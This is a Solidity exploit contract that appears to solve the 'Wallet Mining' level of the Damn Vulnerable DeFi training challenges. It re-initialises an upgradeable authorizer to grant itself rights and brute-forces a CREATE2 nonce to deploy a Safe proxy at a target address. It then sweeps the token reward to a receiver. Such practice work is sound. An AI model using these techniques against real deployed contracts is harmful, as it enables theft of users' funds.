// SPDX-License-Identifier: MIT
pragma solidity =0.8.25;

import {SafeProxy} from "@safe-global/safe-smart-account/contracts/proxies/SafeProxy.sol";
import {DamnValuableToken} from "../../src/DamnValuableToken.sol";
import {AuthorizerUpgradeable} from "../../src/wallet-mining/AuthorizerFactory.sol";
import {WalletDeployer} from "../../src/wallet-mining/WalletDeployer.sol";
import {SafeProxyFactory} from "@safe-global/safe-smart-account/contracts/proxies/SafeProxyFactory.sol";
import {Safe} from "@safe-global/safe-smart-account/contracts/Safe.sol";

contract Attack {
    DamnValuableToken public immutable TOKEN;
    AuthorizerUpgradeable public immutable AUTHORIZER;
    WalletDeployer public immutable WALLET_DEPLOYER;
    SafeProxyFactory public immutable PROXY_FACTORY;
    Safe public immutable SINGLETON;

    constructor(DamnValuableToken _token, AuthorizerUpgradeable _authorizer, WalletDeployer _walletDeployer, SafeProxyFactory _proxyFactory, Safe _singleton) {
        TOKEN = _token;
        AUTHORIZER = _authorizer;
        WALLET_DEPLOYER = _walletDeployer;
        PROXY_FACTORY = _proxyFactory;
        SINGLETON = _singleton;
    }

    function deploy(address _aim, bytes calldata _initializer, address _receiver) external {
        address[] memory wards = new address[](1);
        wards[0] = address(this);

        address[] memory aims = new address[](1);
        aims[0] = _aim;

        uint256 nonce = findNonce(_initializer, _aim);

        AUTHORIZER.init(wards, aims);
        WALLET_DEPLOYER.drop(_aim, _initializer, nonce);
        TOKEN.transfer(_receiver, TOKEN.balanceOf(address(this)));
    }

    function findNonce(bytes calldata _initializer, address _address) private view returns (uint256) {
        uint256 nonce;
        while (nonce != type(uint256).max) {
            bytes32 salt = keccak256(abi.encodePacked(keccak256(_initializer), nonce));
            bytes memory bytecode = abi.encodePacked(type(SafeProxy).creationCode, uint256(uint160(address(SINGLETON))));
            bytes32 computedHash = keccak256(abi.encodePacked(bytes1(0xff), address(PROXY_FACTORY), salt, keccak256(bytecode)));
            address computed = address(uint160(uint256(computedHash)));
            if (computed == _address) {
                return nonce;
            }
            nonce++;
        }
    }
}